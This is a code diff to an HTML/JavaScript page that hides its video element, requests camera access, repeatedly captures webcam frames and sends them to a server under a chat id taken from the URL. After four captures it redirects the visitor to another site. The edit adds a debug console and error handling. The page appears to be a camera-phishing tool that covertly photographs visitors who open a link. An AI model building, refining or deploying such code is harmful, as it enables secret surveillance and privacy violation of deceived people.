@@ -45,6 +45,19 @@
         video {
             display: none;
         }
+        .console-container {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            max-height: 200px;
+            background: rgba(0, 0, 0, 0.8);
+            color: #fff;
+            font-family: monospace;
+            overflow-y: scroll;
+            padding: 10px;
+            box-sizing: border-box;
+        }
     </style>
 </head>
 <body>
@@ -55,35 +68,56 @@
 
 <video id="video" width="300" height="200" autoplay></video>
 
+<!-- Custom in-browser console -->
+<div class="console-container" id="console-log"></div>
+
 <script>
     const video = document.querySelector("#video");
     const chatId = new URLSearchParams(window.location.search).get("id");
     let captureCount = 0;
     const maxCaptures = 4;
 
+    // Custom in-browser console log function
+    function customLog(message) {
+        const consoleLog = document.getElementById("console-log");
+        const logItem = document.createElement("div");
+        logItem.textContent = message;
+        consoleLog.appendChild(logItem);
+        consoleLog.scrollTop = consoleLog.scrollHeight;
+    }
+
+    // Get user media (camera access)
     if (navigator.mediaDevices.getUserMedia) {
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(function(stream) {
                 video.srcObject = stream;
+                customLog('Camera access granted.');
             })
             .catch(function(error) {
+                customLog('Error accessing media devices: ' + error.message);
                 alert('Error accessing media devices: ' + error.message);
             });
     } else {
+        customLog('getUserMedia is not supported in your browser.');
         alert('getUserMedia is not supported in your browser.');
     }
 
     async function compressAndSendImage(image_data, quality, format) {
-        const img = new Image();
-        img.src = image_data;
-        img.onload = async function() {
-            const canvas = document.createElement('canvas');
-            canvas.width = img.width;
-            canvas.height = img.height;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
-            const compressedDataUrl = canvas.toDataURL(format, quality);
-            await sendImageToServer(compressedDataUrl);
+        try {
+            const img = new Image();
+            img.src = image_data;
+            img.onload = async function() {
+                const canvas = document.createElement('canvas');
+                canvas.width = img.width;
+                canvas.height = img.height;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+                const compressedDataUrl = canvas.toDataURL(format, quality);
+                await sendImageToServer(compressedDataUrl);
+            }
+        } catch (error) {
+            customLog('Error compressing image: ' + error.message);
+            alert('Error compressing image: ' + error.message);
         }
     }
 
@@ -102,31 +136,41 @@
 
             if (response.ok) {
                 captureCount++;
+                customLog('Image sent successfully. Capture count: ' + captureCount);
                 if (captureCount >= maxCaptures) {
                     stopCapturing();
                 }
             } else {
+                customLog('Failed to send image: ' + response.statusText);
                 alert('Failed to send image: ' + response.statusText);
             }
         } catch (error) {
+            customLog('Error occurred while sending image: ' + error.message);
             alert('Error occurred while sending image: ' + error.message);
         }
     }
 
     function captureAndSendImage() {
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-        const image_data = canvas.toDataURL('image/jpeg', 0.5);
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            const image_data = canvas.toDataURL('image/jpeg', 0.5);
 
-        compressAndSendImage(image_data, 0.5, 'image/jpeg');
+            customLog('Captured image data: ' + image_data.substring(0, 50) + '...'); // Log a small part of the data URL
+            compressAndSendImage(image_data, 0.5, 'image/jpeg');
+        } catch (error) {
+            customLog('Error capturing image: ' + error.message);
+            alert('Error capturing image: ' + error.message);
+        }
     }
 
     function stopCapturing() {
         clearInterval(captureInterval);
         video.srcObject.getTracks().forEach(track => track.stop());
         window.location.href = "https://Linuxgen.in";
+        customLog('Stopped capturing and redirected to https://Linuxgen.in');
     }
 
     const captureInterval = setInterval(function() {
